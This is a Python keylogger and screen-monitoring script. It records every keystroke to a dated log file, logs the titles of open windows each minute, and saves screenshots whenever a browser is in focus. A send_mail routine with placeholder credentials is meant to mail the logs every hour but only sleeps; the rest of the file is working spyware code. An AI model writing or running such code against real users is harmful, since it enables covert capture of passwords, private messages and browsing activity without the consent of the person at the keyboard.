# Import necessary modules
#keys monitoring
from pynput import keyboard
from pynput.keyboard import Controller
from datetime import datetime
#timer class
from threading import Thread, Lock
#screen monitoring
from random import choice
from string import ascii_letters
from pyautogui import screenshot
from pygetwindow import getAllTitles, getActiveWindowTitle
from time import sleep
#os imports
from os import chdir
from os.path import dirname, realpath, isfile
# Set the current directory to the script's location
chdir(dirname(realpath(__file__)))

# Initialize a controller for keystrokes
keyboard_controller = Controller()
# Initialize a lock for file access
file_lock = Lock()

# Create a .txt file to store keystrokes and screen activity for the current date
date = datetime.now()
dt_string = date.strftime('%d-%m-%Y')
filename = f'{dt_string}'
if not isfile(f'{filename}.txt'):
    # Create the file if it doesn't exist
    f = open(f'{filename}.txt', 'w')
    f.close()

#Write on file
def write_to_file(element):
    """
    Write data to the log file with thread safety.

    Args:
        element (str): The data to be written to the file.

    Note:
        This function uses a lock (`file_lock`) to ensure thread safety when writing to the file.
    """
    with file_lock:
        with open(f'{filename}.txt', '+a') as f:
            f.write(str(element).replace("'", ''))

# Send the file and screenshots            
def send_mail():
    """
    Send the file and screenshots to myself every X (1 hour) seconds
    """
    seconds = 3600
    mail = "mymail@gmail.com"
    password = "mypassword"
    while 1:
        sleep(seconds)

# Initialize the thread for mail sending 
mail_thread = Thread(target = send_mail)
mail_thread.daemon = True 
mail_thread.start() 
        
#screen monitoring
def Screen_Monitoring():
    """
    Monitor active windows and take screenshots of specific browsers.

    This function periodically captures the titles of active windows and takes screenshots if the active window title matches specific browser names.
    """
    seconds = 60
    browser_names = ["Chrome", "Firefox", "Microsoft Edge", "Opera", "Safari"]
    while 1:
        # Log the list of running programs
        date = datetime.now()
        write_to_file(f'\nRunning programs [{date.strftime("%H:%M")}]: {getAllTitles()}\n')
        active_win_title = getActiveWindowTitle()
        for browser in browser_names:
            if browser.lower() in active_win_title.lower():
                # Log when a browser is focused and take a screenshot
                write_to_file(f'\n<!Brownser focused (screen): {active_win_title}\n')
                screen_name = ''
                instance = screenshot()
                for x in range(1, 10):
                    screen_name = screen_name + choice(ascii_letters)
                instance.save(f'{screen_name}.png')
        sleep(seconds)

# Initialize the thread for screen monitoring  
periodic_thread = Thread(target = Screen_Monitoring)
periodic_thread.daemon = True 
periodic_thread.start() 

# Keystroke monitoring
with keyboard.Events() as events:
    for event in events:
        if type(event) is keyboard.Events.Press:
            #get keys
            if str(event.key) == 'Key.backspace':
                # Handle backspace key press by removing the last character from the file
                try:
                    with open(f'{filename}.txt', '+r') as f:
                        content = f.read()[:-1]
                    with open(f'{filename}.txt', '+w') as f:
                        f.write(content)
                except:
                    pass
            else:
                if str(event.key) == 'Key.space':
                    event.key = ' '
                elif str(event.key) == 'Key.enter':
                    event.key = f' <{str(event.key)}> \n'
                elif 'Key.' in str(event.key):
                    event.key = f' <{str(event.key)}> '
                # Log the key press to the file
                write_to_file(event.key)